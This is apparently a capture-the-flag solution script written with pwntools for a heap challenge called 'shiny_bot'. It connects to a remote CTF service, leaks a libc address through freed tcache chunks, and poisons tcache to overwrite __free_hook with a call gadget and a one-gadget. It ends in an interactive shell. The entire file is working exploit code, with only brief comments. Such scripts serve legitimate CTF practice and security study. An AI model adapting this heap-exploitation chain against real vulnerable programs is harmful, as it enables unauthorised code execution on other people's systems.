from pwn import *

context(os='linux', arch='amd64')

r = remote("ctf.hackusati.tech", 7004)
elf = ELF("./shiny_bot")
libc = ELF("./libc.so.6")

off_arena96_libc = 0x3ebca0
off_free_hook = libc.symbols["__free_hook"]
off_malloc_hook = libc.symbols["__malloc_hook"]
onegadgets = [0x4f2c5, 0x4f322, 0x10a38c]
callrdi_gad = 0x1d45f1


def add(data):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b">")
    r.send(data)


def free(ix):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"> ")
    r.sendline(str(ix).encode())


def show():
    r.recvuntil(b"> ")
    r.sendline(b"3")


def exit():
    r.recvuntil(b"> ")
    r.sendline(b"0")


def edit(ix, data):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"> ")
    r.sendline(str(ix).encode())
    r.recvuntil(b">")
    r.send(data)


def exploit():
    # consume tcache
    for i in range(8):
        add(b"A" * 0x10)
    for i in range(1, 8):
        free(i)
    free(0)  # generate main_arena+96 on heap
    show()  # leak main_arena+96

    r.recvuntil(b"is:\n")
    mainarena96 = u64(r.recvuntil(b" ...")[:-4])
    log.success("mainarena96: " + hex(mainarena96))
    libc_base = mainarena96 - off_arena96_libc
    log.success("libc_base: " + hex(libc_base))
    malloc_hook = libc_base + off_malloc_hook
    free_hook = libc_base + off_free_hook
    log.success("__malloc_hook: " + hex(malloc_hook))
    onegadget0 = libc_base + onegadgets[0]
    log.success("onegadget0: " + hex(onegadget0))

    # make tcache point to __free_hook and overwrite it with call[rdi]-gadgets,
    # because just calling onegadget is interrupted with MOVAPS!
    # So, just do easy ROP with the argment of free()
    edit(7, p64(free_hook))
    add(b"C" * 0x10)
    add(p64(libc_base + callrdi_gad))  # gad: call qword [rdi]
    edit(5, p64(onegadget0))
    r.recvuntil(b"> ")
    r.sendline(b"2")

    # invoke gadgets and get the shell!
    r.recvuntil(b"> ")
    r.sendline(b"5")


exploit()
r.interactive()
